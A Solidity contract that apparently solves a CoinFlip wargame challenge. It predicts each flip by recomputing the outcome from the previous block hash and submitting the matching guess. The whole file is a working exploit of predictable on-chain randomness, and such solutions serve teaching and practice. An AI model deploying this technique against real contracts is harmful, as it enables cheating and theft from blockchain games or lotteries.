// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip{
    function flip(bool _guess) external returns(bool);
}

contract AttackCoinflip {

    ICoinFlip CoinFlip;

    address owner;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        CoinFlip = ICoinFlip(_coinFlip);
        owner = msg.sender;
    }

    function attackCoinflip() public {
        require(owner == msg.sender,"not the owner");
        uint256 blockValue = uint256(blockhash(block.number-1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip.flip(side);
    }

 
}